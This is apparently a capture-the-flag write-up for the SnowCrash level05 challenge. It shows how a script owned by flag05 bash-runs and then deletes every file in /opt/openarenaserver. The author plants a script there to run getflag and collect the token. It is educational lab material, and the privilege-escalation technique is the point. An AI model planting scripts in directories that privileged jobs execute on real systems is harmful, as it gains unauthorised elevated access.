```sh
level05@SnowCrash:~$ find / -user flag05 -group flag05 | less
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

```sh
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

**this is a sh script who execute with bash every file in /opt/openarenaserver**
**and then delete it**

**but we don't have the right do execute it**

```sh
level05@SnowCrash:~$ ls -la /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
level05@SnowCrash:~$ openarenaserver
bash: /usr/sbin/openarenaserver: Permission denied
```

```sh
touch /opt/openarenaserver/file

level05@SnowCrash:~$ ls /opt/openarenaserver/
file
level05@SnowCrash:~$ ls /opt/openarenaserver/
file
level05@SnowCrash:~$ ls /opt/openarenaserver/
level05@SnowCrash:~$ 
```

**the file get deleted so the script is executed automaticaly**
**we write a script in /opt/openarenaserver who execute the getflag command**

```sh
vi /opt/openarenaserver/script.sh and chmod 777 /opt/openarenaserver/script.sh
```

```sh
#!/bin/bash

getflag > /tmp/flag.txt
```sh

```sh
level05@SnowCrash:~$ ls /opt/openarenaserver/
script.sh
level05@SnowCrash:~$ ls /opt/openarenaserver/
script.sh
level05@SnowCrash:~$ ls /opt/openarenaserver/
level05@SnowCrash:~$ cat /tmp/flag.txt
Check flag.Here is your token : ******flag******
```
